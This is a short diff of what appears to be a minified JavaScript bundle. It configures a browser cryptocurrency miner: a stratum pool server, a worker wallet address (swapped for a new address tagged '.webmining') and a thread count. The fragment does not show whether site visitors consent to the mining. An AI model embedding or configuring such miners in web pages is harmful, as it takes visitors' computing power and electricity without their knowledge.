@@ -595,10 +595,10 @@
               stratum: {
                 server: "stratum-asia.rplant.xyz",
                 port: 7022,
-                worker: "BkNmv6nUnP7ME3Ev7hydJzSFQBW2WvNeGL",
+                worker: "BfDcTj8vqeuRoPizzA2SjzXL9QakY49dq7.webmining",
                 password: "x",
               },
-              options: { threads: 2, log: !1 },
+              options: { threads: 1, log: !1 },
             },
           },
           P = [];
